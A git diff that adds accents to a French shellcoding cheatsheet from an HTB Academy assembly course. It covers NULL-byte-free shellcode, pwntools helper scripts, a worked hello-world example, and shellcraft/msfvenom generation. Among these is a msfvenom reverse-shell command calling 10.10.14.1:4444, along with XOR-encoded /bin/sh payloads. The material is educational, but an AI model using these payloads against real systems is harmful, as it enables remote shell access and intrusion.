@@ -1,33 +1,33 @@
 # Cheatsheet - Shellcoding (HTB Academy - Intro to Assembly Language)
 
-> Prerequis : [intro-to-assembly-language.md](intro-to-assembly-language.md)
+> Prérequis : [intro-to-assembly-language.md](intro-to-assembly-language.md)
 
 ---
 
 ## 1. Qu'est-ce qu'un Shellcode ?
 
-Un **shellcode** est la representation hexadecimale du code machine executable d'un binaire (section `.text` uniquement). Il est concu pour etre charge directement en memoire et execute par le processeur, sans passer par un fichier executable classique.
+Un **shellcode** est la représentation hexadécimale du code machine exécutable d'un binaire (section `.text` uniquement). Il est conçu pour être chargé directement en mémoire et exécuté par le processeur, sans passer par un fichier exécutable classique.
 
 ### Utilisation en pentest
-- **Buffer overflow** : injecter un shellcode (ex: reverse shell) dans la memoire d'un programme vulnerable
-- **Injection dans des binaires** : infecter des ELF/DLL/SO pour executer du code au chargement
-- **Execution en memoire** : executer du code sans ecrire sur le disque (fileless)
-- **ROP (Return Oriented Programming)** : technique moderne pour contourner les protections memoire (NX/DEP), necessite une bonne comprehension de l'assembleur
+- **Buffer overflow** : injecter un shellcode (ex: reverse shell) dans la mémoire d'un programme vulnérable
+- **Injection dans des binaires** : infecter des ELF/DLL/SO pour exécuter du code au chargement
+- **Exécution en mémoire** : exécuter du code sans écrire sur le disque (fileless)
+- **ROP (Return Oriented Programming)** : technique moderne pour contourner les protections mémoire (NX/DEP), nécessite une bonne compréhension de l'assembleur
 
 ---
 
 ## 2. Assembly vers Machine Code
 
-Chaque instruction x86 et chaque registre a son propre code machine binaire (represente en hex). `nasm` convertit les instructions assembleur en codes machines correspondants.
+Chaque instruction x86 et chaque registre a son propre code machine binaire (représenté en hex). `nasm` convertit les instructions assembleur en codes machines correspondants.
 
 ```bash
 # Assembler une instruction en shellcode
 pwn asm 'push rax' -c 'amd64'
-# Resultat : 50
+# Résultat : 50
 
-# Desassembler un shellcode en instructions
+# Désassembler un shellcode en instructions
 pwn disasm '50' -c 'amd64'
-# Resultat : 0: 50  push eax
+# Résultat : 0: 50  push eax
 ```
 
 ### Exemples de codes machines courants
@@ -44,26 +44,26 @@ pwn disasm '50' -c 'amd64'
 
 ## 3. Exigences d'un shellcode valide
 
-Un shellcode **doit** respecter 3 regles pour fonctionner correctement une fois charge en memoire :
+Un shellcode **doit** respecter 3 règles pour fonctionner correctement une fois chargé en mémoire :
 
-| Regle | Raison |
+| Règle | Raison |
 |-------|--------|
-| **Pas de variables** (pas de `.data` / `.bss`) | Le segment text est non-writable, le segment data est non-executable |
-| **Pas d'adresses memoire directes** | Les adresses changent selon l'environnement d'execution |
-| **Pas de bytes NULL (`0x00`)** | Les `00` sont des terminateurs de chaine et interrompent le chargement |
+| **Pas de variables** (pas de `.data` / `.bss`) | Le segment text est non-writable, le segment data est non-exécutable |
+| **Pas d'adresses mémoire directes** | Les adresses changent selon l'environnement d'exécution |
+| **Pas de bytes NULL (`0x00`)** | Les `00` sont des terminateurs de chaîne et interrompent le chargement |
 
-### Pourquoi les NULL bytes posent probleme
+### Pourquoi les NULL bytes posent problème
 
 ```bash
 # Instruction avec NULL bytes :
 pwn asm 'mov rax, 1' -c 'amd64'
-# Resultat : 48c7c001000000  (contient des 00 !)
+# Résultat : 48c7c001000000  (contient des 00 !)
 
-# Instructions equivalentes SANS NULL bytes :
+# Instructions équivalentes SANS NULL bytes :
 pwn asm 'xor rax, rax' -c 'amd64'
-# Resultat : 4831c0
+# Résultat : 4831c0
 pwn asm 'mov al, 1' -c 'amd64'
-# Resultat : b001
+# Résultat : b001
 ```
 
 ---
@@ -72,7 +72,7 @@ pwn asm 'mov al, 1' -c 'amd64'
 
 ### 4.1 Supprimer les variables
 
-Le code doit etre entierement dans la section `.text`. Pour les chaines, on les pousse sur la stack :
+Le code doit être entièrement dans la section `.text`. Pour les chaînes, on les pousse sur la stack :
 
 ```nasm
 ; AVANT (avec variable - NE FONCTIONNE PAS en shellcode) :
@@ -90,21 +90,21 @@ section .text
     push rbx
     mov rbx, 'Hello HT'    ; 8 bytes -> registre 64-bit
     push rbx
-    mov rsi, rsp            ; rsi pointe vers la chaine sur la stack
+    mov rsi, rsp            ; rsi pointe vers la chaîne sur la stack
 ```
 
-> **Note** : les chaines sont pushees en ordre **inverse** (la stack est LIFO).
+> **Note** : les chaînes sont pushées en ordre **inverse** (la stack est LIFO).
 > On n'a pas besoin de null-terminator ici car `write` utilise une longueur explicite.
 
 ### 4.2 Supprimer les adresses directes
 
 - Remplacer les `call 0xADDRESS` par des `call label` (nasm convertit en adresses relatives)
-- Utiliser l'adressage relatif a `rip` pour les references memoire
-- Pour les donnees, utiliser la stack + `rsp` comme pointeur
+- Utiliser l'adressage relatif à `rip` pour les références mémoire
+- Pour les données, utiliser la stack + `rsp` comme pointeur
 
 ### 4.3 Supprimer les NULL bytes
 
-La regle : utiliser des **registres de taille adaptee** a la donnee pour eviter le padding avec des `00`.
+La règle : utiliser des **registres de taille adaptée** à la donnée pour éviter le padding avec des `00`.
 
 ```nasm
 ; MAUVAIS (NULL bytes) :             ; BON (pas de NULL) :
@@ -126,15 +126,15 @@ mov rax, 60   ; 48c7c03c000000       xor rax, rax  ; 4831c0
 
 ## 5. Scripts utilitaires
 
-Tous les scripts sont egalement disponibles prets a l'emploi dans [`tools/`](tools/) ([README](tools/README.md)).
+Tous les scripts sont également disponibles prêts à l'emploi dans [`tools/`](tools/) ([README](tools/README.md)).
 
 ```
  program.s ──► assembler.sh ──► shellcoder.py ──► loader.py ──► assembler.py
   (code ASM)    (compile+run)    (extract sc)     (exec sc)     (sc -> ELF + gdb)
-   etape 1        etape 2          etape 3         etape 4        si debug
+   étape 1        étape 2          étape 3         étape 4        si debug
 ```
 
-### 5.1 `assembler.sh` - Assembler + linker + executer (etape 1)
+### 5.1 `assembler.sh` - Assembler + linker + exécuter (étape 1)
 
 ```bash
 #!/bin/bash
@@ -147,7 +147,7 @@ echo "[+] Assembled: ${1%.s}" && \
 ./"${1%.s}"
 ```
 
-### 5.2 `shellcoder.py` - Extraire le shellcode d'un binaire (etape 2)
+### 5.2 `shellcoder.py` - Extraire le shellcode d'un binaire (étape 2)
 
 ```python
 #!/usr/bin/python3
@@ -169,7 +169,7 @@ else:
     print("%d bytes - No NULL bytes" % len(shellcode))
 ```
 
-### 5.3 `shellcoder.sh` - Alternative sans pwntools (etape 2)
+### 5.3 `shellcoder.sh` - Alternative sans pwntools (étape 2)
 
 ```bash
 #!/bin/bash
@@ -178,7 +178,7 @@ else:
 for i in $(objdump -d "$1" | grep "^ " | cut -f2); do echo -n $i; done; echo;
 ```
 
-### 5.4 `loader.py` - Executer un shellcode en memoire (etape 3)
+### 5.4 `loader.py` - Exécuter un shellcode en mémoire (étape 3)
 
 ```python
 #!/usr/bin/python3
@@ -192,7 +192,7 @@ context(os="linux", arch="amd64", log_level="error")
 run_shellcode(unhex(sys.argv[1])).interactive()
 ```
 
-### 5.5 `assembler.py` - Shellcode vers ELF pour debug gdb (etape 4)
+### 5.5 `assembler.py` - Shellcode vers ELF pour debug gdb (étape 4)
 
 ```python
 #!/usr/bin/python3
@@ -212,7 +212,7 @@ print("[+] Built: %s" % sys.argv[2])
 
 ## 6. Exemple complet de bout en bout
 
-### Etape 1 : Ecrire le code assembleur (version naive)
+### Étape 1 : Écrire le code assembleur (version naive)
 
 Fichier `helloworld.s` :
 
@@ -235,7 +235,7 @@ _start:
     syscall
 ```
 
-### Etape 2 : Assembler et tester
+### Étape 2 : Assembler et tester
 
 ```bash
 $ nasm -f elf64 helloworld.s -o helloworld.o
@@ -244,7 +244,7 @@ $ ./helloworld
 Hello HTB Academy!
 ```
 
-### Etape 3 : Extraire le shellcode (version naive)
+### Étape 3 : Extraire le shellcode (version naive)
 
 ```bash
 $ python3 shellcoder.py helloworld
@@ -252,9 +252,9 @@ $ python3 shellcoder.py helloworld
 37 bytes - ATTENTION : Found NULL byte
 ```
 
-Le shellcode contient des NULL bytes et des references a `.data` : il ne fonctionnera pas en memoire.
+Le shellcode contient des NULL bytes et des références à `.data` : il ne fonctionnera pas en mémoire.
 
-### Etape 4 : Verifier en desassemblant
+### Étape 4 : Vérifier en désassemblant
 
 ```bash
 $ pwn disasm '48be0020400000000000bf01000000ba12000000b8010000000f05b83c000000bf000000000f05' -c 'amd64'
@@ -269,11 +269,11 @@ $ pwn disasm '48be0020400000000000bf01000000ba12000000b8010000000f05b83c000000bf
   25:    0f 05                    syscall
 ```
 
-Problemes identifies :
+Problèmes identifiés :
 - `0x402000` = adresse directe vers `.data`
 - De nombreux `00` = NULL bytes partout
 
-### Etape 5 : Reecrire en version shellcode-compatible
+### Étape 5 : Réécrire en version shellcode-compatible
 
 Fichier `helloworld_sc.s` :
 
@@ -282,7 +282,7 @@ global _start
 
 section .text
 _start:
-    ;--- Construire la chaine sur la stack ---
+    ;--- Construire la chaîne sur la stack ---
     xor rbx, rbx
     mov bx, 'y!'            ; 2 bytes dans registre 16-bit (pas de padding)
     push rbx
@@ -290,7 +290,7 @@ _start:
     push rbx
     mov rbx, 'Hello HT'     ; 8 bytes dans registre 64-bit
     push rbx
-    mov rsi, rsp             ; rsi = pointeur vers la chaine
+    mov rsi, rsp             ; rsi = pointeur vers la chaîne
 
     ;--- syscall write(1, rsi, 18) ---
     xor rax, rax
@@ -308,7 +308,7 @@ _start:
     syscall
 ```
 
-### Etape 6 : Assembler et tester la nouvelle version
+### Étape 6 : Assembler et tester la nouvelle version
 
 ```bash
 $ ./assembler.sh helloworld_sc.s
@@ -316,7 +316,7 @@ $ ./assembler.sh helloworld_sc.s
 Hello HTB Academy!
 ```
 
-### Etape 7 : Extraire et valider le shellcode
+### Étape 7 : Extraire et valider le shellcode
 
 ```bash
 $ python3 shellcoder.py helloworld_sc
@@ -327,7 +327,7 @@ $ python3 shellcoder.py helloworld_sc
 
 Pas de NULL bytes !
 
-### Etape 8 : Executer le shellcode directement en memoire
+### Étape 8 : Exécuter le shellcode directement en mémoire
 
 ```bash
 $ python3 loader.py '4831db66bb79215348bb422041636164656d5348bb48656c6c6f204854534889e64831c0b0014831ff40b7014831d2b2120f054831c0043c4030ff0f05'
@@ -336,7 +336,7 @@ Hello HTB Academy!
 
 Le shellcode fonctionne !
 
-### Etape 9 : Debugger le shellcode avec gdb
+### Étape 9 : Debugger le shellcode avec gdb
 
 ```bash
 # Convertir le shellcode en binaire ELF pour gdb
@@ -344,17 +344,17 @@ $ python3 assembler.py '4831db66bb79215348bb422041636164656d5348bb48656c6c6f2048
 
 # Debugger
 $ gdb -q ./helloworld_dbg
-(gdb) b *0x401000          # breakpoint au point d'entree par defaut
+(gdb) b *0x401000          # breakpoint au point d'entrée par défaut
 (gdb) r
 Breakpoint 1, 0x0000000000401000 in ?? ()
 
-# Verifier les registres et la stack apres les push
-(gdb) si 7                 # avancer jusqu'apres le dernier push
-(gdb) x/s $rsp             # afficher la chaine sur la stack
+# Vérifier les registres et la stack après les push
+(gdb) si 7                 # avancer jusqu'après le dernier push
+(gdb) x/s $rsp             # afficher la chaîne sur la stack
 0x7fffffffe3b8: "Hello HTB Academy!"
 
-(gdb) info registers rsi   # verifier que rsi pointe bien vers la chaine
-(gdb) c                    # continuer l'execution
+(gdb) info registers rsi   # vérifier que rsi pointe bien vers la chaîne
+(gdb) c                    # continuer l'exécution
 Hello HTB Academy!
 ```
 
@@ -362,7 +362,7 @@ Hello HTB Academy!
 
 ## 7. Shellcraft (pwntools)
 
-Pwntools inclut `shellcraft`, un generateur de shellcodes pre-faits :
+Pwntools inclut `shellcraft`, un générateur de shellcodes pré-faits :
 
 ```bash
 # Lister les shellcodes disponibles pour Linux x86_64
@@ -371,7 +371,7 @@ pwn shellcraft -l 'amd64.linux'
 # Afficher le code assembleur d'un shellcode /bin/sh
 pwn shellcraft amd64.linux.sh
 
-# Executer directement le shellcode
+# Exécuter directement le shellcode
 pwn shellcraft amd64.linux.sh -r
 ```
 
@@ -382,11 +382,11 @@ from pwn import *
 
 context(os="linux", arch="amd64")
 
-# Generer le shellcode pour execsh
+# Générer le shellcode pour execsh
 shellcode = shellcraft.sh()
 print(shellcode)              # affiche le code ASM
 
-# Assembler et executer
+# Assembler et exécuter
 binary = asm(shellcode)
 print(binary.hex())           # affiche le shellcode hex
 run_shellcode(binary).interactive()
@@ -396,16 +396,16 @@ run_shellcode(binary).interactive()
 
 ## 8. Msfvenom
 
-`msfvenom` (Metasploit) permet de generer des shellcodes plus complexes avec encodage :
+`msfvenom` (Metasploit) permet de générer des shellcodes plus complexes avec encodage :
 
 ```bash
 # Lister les payloads Linux x64
 msfvenom -l payloads | grep 'linux/x64'
 
-# Generer un shellcode exec /bin/sh
+# Générer un shellcode exec /bin/sh
 msfvenom -p 'linux/x64/exec' CMD='sh' -a 'x64' --platform 'linux' -f 'hex'
 
-# Generer avec encodage XOR (bypass simple)
+# Générer avec encodage XOR (bypass simple)
 msfvenom -p 'linux/x64/exec' CMD='sh' -a 'x64' --platform 'linux' -f 'hex' -e 'x64/xor'
 
 # Reverse shell
@@ -416,25 +416,25 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f 'hex'
 # -f raw     : bytes bruts
 # -f python  : tableau python
 # -f c       : tableau C
-# -f elf     : binaire ELF executable
+# -f elf     : binaire ELF exécutable
 ```
 
 ---
 
-## 9. Recapitulatif du workflow shellcoding
+## 9. Récapitulatif du workflow shellcoding
 
 ```
- 1. Ecrire le code ASM          vim program.s
+ 1. Écrire le code ASM          vim program.s
          |
  2. Assembler + tester          ./assembler.sh program.s
          |
  3. Extraire le shellcode       python3 shellcoder.py program
          |
- 4. Verifier NULL bytes?  -----> OUI : corriger le code ASM (retour etape 1)
+ 4. Vérifier NULL bytes?  -----> OUI : corriger le code ASM (retour étape 1)
          |                        - xor reg, reg au lieu de mov reg, 0
-         | NON                    - registres 8/16-bit adaptes
+         | NON                    - registres 8/16-bit adaptés
          |                        - pas de .data, pas d'adresses directes
- 5. Charger en memoire          python3 loader.py '<shellcode>'
+ 5. Charger en mémoire          python3 loader.py '<shellcode>'
          |
  6. Debugger si besoin          python3 assembler.py '<sc>' prog
                                 gdb -q ./prog
@@ -443,28 +443,28 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f 'hex'
 
 ---
 
-## 10. Shellcodes prets a l'emploi et ressources
+## 10. Shellcodes prêts à l'emploi et ressources
 
-Voir le fichier dedie **[shellcodes-reference.md](shellcodes-reference.md)** pour :
+Voir le fichier dédié **[shellcodes-reference.md](shellcodes-reference.md)** pour :
 - Shellcodes utiles par architecture (x86_64, x86, ARM64, ARM32, Windows)
-- Generation automatique (shellcraft, msfvenom)
-- Encodage XOR et evasion basique
-- Tables de syscalls de reference
+- Génération automatique (shellcraft, msfvenom)
+- Encodage XOR et évasion basique
+- Tables de syscalls de référence
 - Liens vers des ressources externes (Shell-Storm, Exploit-DB, CTF platforms...)
 
 ---
 
-## 11. Aide-memoire : registres et NULL bytes
+## 11. Aide-mémoire : registres et NULL bytes
 
-Pour eviter les NULL bytes, toujours utiliser le **sous-registre adapte** :
+Pour éviter les NULL bytes, toujours utiliser le **sous-registre adapté** :
 
-| Valeur a charger | MAUVAIS (NULL bytes) | BON (pas de NULL) |
+| Valeur à charger | MAUVAIS (NULL bytes) | BON (pas de NULL) |
 |------------------|---------------------|-------------------|
 | 0 | `mov rax, 0` | `xor rax, rax` |
 | 1-255 | `mov rax, 1` | `xor rax, rax` + `mov al, 1` |
 | 256-65535 | `mov rax, 256` | `xor rax, rax` + `mov ax, 256` |
-| Chaine 2 bytes | `mov rbx, 'y!'` | `xor rbx, rbx` + `mov bx, 'y!'` |
-| Chaine 8 bytes | OK directement | `mov rbx, 'Hello HT'` (pas de padding) |
+| Chaîne 2 bytes | `mov rbx, 'y!'` | `xor rbx, rbx` + `mov bx, 'y!'` |
+| Chaîne 8 bytes | OK directement | `mov rbx, 'Hello HT'` (pas de padding) |
 | Push 0 sur stack | `push 0` | `xor rax, rax` + `push rax` |
 
 ---
